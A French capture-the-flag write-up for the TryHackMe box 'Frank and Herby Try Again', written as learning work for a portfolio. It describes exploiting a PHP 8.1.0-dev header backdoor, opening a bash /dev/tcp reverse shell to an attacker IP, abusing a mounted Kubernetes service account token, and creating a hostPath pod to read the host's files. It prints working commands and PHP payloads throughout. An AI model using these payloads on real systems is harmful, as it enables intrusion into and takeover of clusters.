# Frank and Herby Try Again..... — TryHackMe (Medium)

**Thème :** Kubernetes, RCE PHP, Service Account Token Abuse, Pod Creation Privilege Escalation
**Difficulté :** Medium
**Auteur :** n40y

---

## Introduction

Cette box m'a permis de découvrir concrètement l'exploitation d'un cluster **Kubernetes** mal configuré, à partir d'une simple RCE PHP exposée publiquement. Le chemin d'attaque complet part d'un header HTTP vulnérable, passe par l'abus d'un **Service Account Token** monté dans le pod, et se termine par une élévation de privilèges via la création d'un pod malveillant montant le système de fichiers du nœud hôte (`hostPath`).

---

## 1. Reconnaissance

### 1.1 Scan initial

```bash
nmap -A 10.129.177.0
```

Un seul port est visible sur un scan rapide (top 1000) :

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
```

### 1.2 Scan complet des ports

Le scan initial étant peu concluant, un scan sur l'intégralité de la plage de ports s'imposait :

```bash
nmap -p- --min-rate 5000 10.129.177.0
```

Résultat :

```
22/tcp    open  ssh
10250/tcp open  unknown
10255/tcp open  unknown
10257/tcp open  unknown
10259/tcp open  unknown
16443/tcp open  unknown
25000/tcp open  icl-twobase1
30679/tcp open  unknown
```

Ces ports (10250, 10255, 10257, 10259, 16443) sont typiques d'une infrastructure **Kubernetes / MicroK8s** :

| Port  | Service                              |
|-------|---------------------------------------|
| 10250 | Kubelet API                          |
| 10255 | Kubelet read-only (metrics)          |
| 10257 | kube-controller-manager              |
| 10259 | kube-scheduler                       |
| 16443 | API Server Kubernetes (HTTPS)        |
| 25000 | MicroK8s cluster agent (Gunicorn)    |
| 30679 | NodePort — application PHP exposée   |

### 1.3 Identification du service applicatif

```bash
nmap -A 10.129.177.0 -p 10250,10255,10257,10259,16443,25000,30679
```

Le port **30679** révèle le point d'entrée applicatif :

```
30679/tcp open  http     PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title: FRANK RULEZZ!
```

Le certificat TLS du port 16443 confirme également la nature du cluster :

```
Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default,
DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster,
DNS:kubernetes.default.svc.cluster.local
```

**PHP 8.1.0-dev** est immédiatement suspect : cette branche de développement contient une backdoor connue, exploitée via un header HTTP spécifique.

---

## 2. Exploitation

### 2.1 La backdoor PHP 8.1.0-dev

La version *dev* de PHP 8.1.0 (mars 2021) a été compromise suite à un incident de sécurité sur le dépôt git.php.net : un commit malveillant introduisait une backdoor déclenchée par un header HTTP nommé `User-Agentt` (avec deux "t"), permettant l'exécution de code arbitraire via la fonction `zerodiumsystem()`.

### 2.2 Preuve de concept

```bash
curl -H "User-Agentt: zerodiumsystem('whoami');" http://10.129.177.0:30679
```

```
root
```

Confirmation de l'exécution de commandes en tant que **root** :

```bash
curl -H "User-Agentt: zerodiumsystem('id');" http://10.129.177.0:30679
```

```
uid=0(root) gid=0(root) groups=0(root)
```

### 2.3 Énumération via la RCE

```bash
curl -H "User-Agentt: zerodiumsystem('ls -la');" http://10.129.177.0:30679
```

```
total 16
-rw-rw-r-- 1 1000 1000  640 Mar 21  2022 index.php
-rw-rw-r-- 1 1000 1000   20 Mar 21  2022 info.php
```

Un premier indice Kubernetes apparaît en vérifiant la présence du répertoire des credentials de Service Account, monté automatiquement dans tout pod :

```bash
curl -H "User-Agentt: zerodiumsystem('ls -la /var/run/secrets/kubernetes.io/serviceaccount');" http://10.129.177.0:30679
```

```
lrwxrwxrwx 1 root root   32 ..data -> ..2026_07_04_21_06_43...
lrwxrwxrwx 1 root root   13 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root root   16 namespace -> ..data/namespace
lrwxrwxrwx 1 root root   12 token -> ..data/token
```

Ce répertoire confirme que l'application tourne **dans un pod Kubernetes**, avec un token de Service Account monté et potentiellement exploitable pour interagir avec l'API Kubernetes.

### 2.4 Obtention d'un reverse shell

La commande unique via `curl` étant limitante, un reverse shell a été établi :

```bash
curl -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/192.168.132.52/4444 0>&1\"');" http://10.129.177.0:30679
```

```bash
nc -lvnp 4444
```

```
connect to [192.168.132.52] from (UNKNOWN) [10.129.177.0] 40690
root@php-deploy-6d998f68b9-6ptjz:/var/www/html#
```

Le nom du prompt (`php-deploy-6d998f68b9-6ptjz`) confirme qu'on se trouve dans un **pod Kubernetes** nommé `php-deploy`, déployé via un ReplicaSet.

**Note technique :** ni `python3`, ni `curl`, ni `wget` ne sont disponibles dans ce conteneur minimaliste — toutes les interactions suivantes avec l'API Kubernetes ont dû être réalisées directement en **PHP** via `file_get_contents()` et les *stream contexts*.

---

## 3. Découverte de l'environnement Kubernetes

### 3.1 Récupération du token de Service Account

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
```

`curl` étant absent, l'appel à l'API Kubernetes a été fait directement en PHP :

```php
$token = trim(file_get_contents("/var/run/secrets/kubernetes.io/serviceaccount/token"));
$namespace = trim(file_get_contents("/var/run/secrets/kubernetes.io/serviceaccount/namespace"));
$url = "https://kubernetes.default.svc/api/v1/namespaces/" . $namespace . "/pods";

$opts = [
    "http" => [
        "method" => "GET",
        "header" => "Authorization: Bearer " . $token . "\r\n"
    ],
    "ssl" => ["verify_peer" => false, "verify_peer_name" => false]
];

$context = stream_context_create($opts);
echo file_get_contents($url, false, $context);
```

Le Service Account associé au pod n'était **pas correctement restreint** (pas de RBAC minimal), permettant la lecture — puis la création — de ressources dans le namespace `frankland`.

### 3.2 Analyse de la définition du pod

La réponse de l'API a révélé la définition complète du pod `php-deploy`, en particulier son volume monté :

```json
"volumes":[{"name":"frank","hostPath":{"path":"/home/herby/app","type":"Directory"}}]
"volumeMounts":[{"name":"frank","mountPath":"/var/www/html"}]
```

Point clé : le pod utilise un volume de type **`hostPath`**, qui monte directement un répertoire du **nœud hôte** (`/home/herby/app`) dans le conteneur (`/var/www/html`). C'est ce mécanisme, combiné à la possibilité de créer de nouveaux pods via l'API, qui va permettre l'évasion vers le système hôte.

L'image utilisée est également révélée : `vulhub/php:8.1-backdoor`, confirmant explicitement la nature volontairement vulnérable du conteneur.

---

## 4. Élévation de privilèges — Container/Pod Escape

### 4.1 Tentative d'escape locale (liens symboliques)

Avant de se tourner vers l'API Kubernetes, deux tentatives locales ont été effectuées :

```bash
ln -s /home/herby /var/www/html/host_home
ln -s ../ /var/www/html/escape_parent
```

Ces liens symboliques ne suffisent pas à sortir du conteneur (ils ne franchissent pas la frontière du namespace du système de fichiers), mais confirment la structure `/home/herby` sur l'hôte.

### 4.2 Stratégie : création d'un pod avec accès complet au disque hôte

Le token de Service Account ayant les droits de créer des pods dans le namespace `frankland`, la stratégie consiste à déployer un **nouveau pod malveillant** montant la racine (`/`) du nœud hôte via un `hostPath`, ce qui donne un accès direct au système de fichiers complet de la machine hôte — bien au-delà du simple répertoire `/home/herby/app`.

```php
$pod_definition = [
    "apiVersion" => "v1",
    "kind" => "Pod",
    "metadata" => ["name" => "pwn-pod"],
    "spec" => [
        "containers" => [[
            "name" => "pwn-container",
            "image" => "alpine",
            "command" => ["sleep", "3600"],
            "volumeMounts" => [[
                "mountPath" => "/mnt/host",
                "name" => "host-root"
            ]]
        ]],
        "volumes" => [[
            "name" => "host-root",
            "hostPath" => ["path" => "/"]
        ]]
    ]
];
```

Requête POST vers l'API :

```php
$opts = [
    "http" => [
        "method" => "POST",
        "header" => "Authorization: Bearer " . $token . "\r\nContent-Type: application/json\r\n",
        "content" => json_encode($pod_definition)
    ],
    "ssl" => ["verify_peer" => false, "verify_peer_name" => false]
];
```

Le pod `pwn-pod` est bien créé côté API (`"phase":"Pending"`), mais reste bloqué en `ImagePullBackOff` : le nœud n'a pas accès à Docker Hub pour tirer l'image `alpine` (environnement isolé / pas de connectivité sortante).

### 4.3 Contournement : réutiliser l'image déjà présente sur le nœud

Puisque l'image `vulhub/php:8.1-backdoor` est **déjà présente localement** sur le nœud (utilisée par le pod original), il suffit de la réutiliser avec `imagePullPolicy: Never` pour éviter tout pull réseau :

```php
$pod_definition = [
    "apiVersion" => "v1",
    "kind" => "Pod",
    "metadata" => ["name" => "escape-pod"],
    "spec" => [
        "containers" => [[
            "name" => "pwn-container",
            "image" => "vulhub/php:8.1-backdoor",
            "imagePullPolicy" => "Never",
            "command" => ["sh", "-c",
                "cp /mnt/host/home/herby/user.txt /mnt/host/home/herby/app/user.txt; " .
                "cp /mnt/host/root/root.txt /mnt/host/home/herby/app/root.txt; " .
                "chown 1000:1000 /mnt/host/home/herby/app/*.txt"
            ],
            "volumeMounts" => [[
                "mountPath" => "/mnt/host",
                "name" => "host-root"
            ]]
        ]],
        "volumes" => [[
            "name" => "host-root",
            "hostPath" => ["path" => "/"]
        ]],
        "restartPolicy" => "Never"
    ]
];
```

**Logique du payload :** ce pod monte la racine (`/`) de l'hôte dans `/mnt/host`, puis copie directement `user.txt` et `root.txt` (situés respectivement dans `/home/herby/` et `/root/` sur l'hôte) vers `/home/herby/app/`, qui correspond justement au volume `hostPath` monté dans le pod original en tant que `/var/www/html`.

Résultat : les flags apparaissent instantanément, accessibles depuis le premier pod compromis (via la RCE PHP initiale), sans même avoir besoin d'un accès shell interactif au pod d'escape :

```bash
ls -la /var/www/html/
```

```
-rw-r--r-- 1 root root   31 cmd.php
-rw-r--r-- 1 1000 1000   32 root.txt
-rw-r--r-- 1 1000 1000   25 user.txt
```

```bash
cat user.txt
cat root.txt
```

```
THM{I-2h0uld-f1r3-fr4nK}
THM{frank-and-herby-still-suck}
```

### 4.4 Nettoyage

Les pods créés durant l'exploitation ont été supprimés proprement via l'API (méthode `DELETE`) afin de ne pas laisser de ressources orphelines dans le cluster :

```php
$opts = [
    "http" => ["method" => "DELETE", "header" => "Authorization: Bearer " . $token . "\r\n"],
    "ssl" => ["verify_peer" => false, "verify_peer_name" => false]
];
```

---

## 5. Résumé de la chaîne d'attaque

```
Scan nmap (full range)
        │
        ▼
Port 30679 → PHP 8.1.0-dev (backdoor "User-Agentt")
        │
        ▼
RCE en tant que root DANS LE CONTENEUR
        │
        ▼
Reverse shell (payload PHP, pas de python/curl/wget dispo)
        │
        ▼
Lecture du Service Account Token (/var/run/secrets/...)
        │
        ▼
Abus de l'API Kubernetes (droits de création de pod, RBAC trop permissif)
        │
        ▼
Création d'un pod "escape-pod" avec hostPath: "/"
        │
        ▼
Exfiltration de user.txt et root.txt depuis le système hôte
```

---

## 6. Points clés retenus

- **PHP 8.1.0-dev backdoor** : ne jamais déployer une build *dev* en production ; toujours vérifier l'intégrité des sources (l'incident git.php.net de 2021 en est l'exemple historique).
- **Service Account non restreint** : chaque pod Kubernetes reçoit par défaut un token de Service Account monté automatiquement. Sans **RBAC** correctement scoping (via `Role`/`RoleBinding`), un attaquant ayant une RCE dans un pod peut interroger — voire manipuler — l'API Kubernetes.
- **`hostPath` = danger** : un volume de type `hostPath` casse l'isolation du conteneur. Combiné à la capacité de créer des pods, il permet un accès complet au système de fichiers du nœud hôte, donc une évasion totale.
- **`imagePullPolicy: Never`** : technique utile en absence de connectivité sortante — réutiliser une image déjà présente localement sur le nœud plutôt que de tenter un pull qui échouera silencieusement en `ImagePullBackOff`.
- **PHP comme client HTTP de secours** : dans un environnement minimaliste sans `curl`/`wget`/`python`, `file_get_contents()` avec un `stream_context` reste une alternative fiable pour dialoguer avec une API REST (y compris en HTTPS avec vérification TLS désactivée).

---

*Box réalisée dans le cadre de mon apprentissage en cybersécurité offensive — writeup rédigé pour mon portfolio [n40y.github.io](https://n40y.github.io).*
